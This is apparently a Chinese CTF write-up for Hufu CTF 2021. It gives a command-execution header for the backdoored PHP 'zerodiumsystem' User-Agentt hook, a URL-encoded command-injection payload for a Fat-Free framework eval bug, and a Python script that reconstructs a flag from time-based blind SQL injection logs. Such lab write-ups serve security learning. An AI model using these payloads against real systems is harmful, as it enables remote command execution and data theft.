## 虎符CTF2021

## 0x01 签到

题目来源是一个新闻，

https://www.freebuf.com/news/267983.html

看git commit可以得知我们通过

user-agentt直接进行命令执行

所以直接user-agentt: zerodiumsystem("cat /flag");
即可。

## unsetme

fatfree unset eval 命令拼接CVE


poc:
```
0%0a);echo%20`cat%20/flag`;print(%27%27
```

得到flag



## 你会日志分析吗

sql盲注反推

```py
import re
from datetime import datetime

f = open("access.log","r")

raw = f.read()

pattern = r"192\.168\.52\.156 - - \[11\/Mar\/2021:(\d+:\d+:\d+) \+0000\] \"GET \/index\.php\?id=1'%20and%20if\(ord\(substr\(\(select%20flag%20from%20flllag\),(\d+),1\)\)=(\d+),sleep\(2\),1\)--"

matches =  re.findall(pattern,raw)
l_time = datetime.strptime("18:00:57", '%H:%M:%S')
i_time = datetime.strptime("18:00:57", '%H:%M:%S')
pos = ""
ch =""
lastmatch = ""

dic = ['0']*48

for match in matches:
    pos = match[1]
    ch  = match[2]
    #print(chr(int(ch)))
    l_time = i_time 
    i_time = datetime.strptime(match[0], '%H:%M:%S')
    #print((i_time-l_time).seconds)
    if (i_time-l_time).seconds>=2:
        print(i_time,l_time)
        print(lastmatch,match)
        dic[int(lastmatch[1])]=chr(int(lastmatch[2]))
    lastmatch = match

print(''.join(dic))
```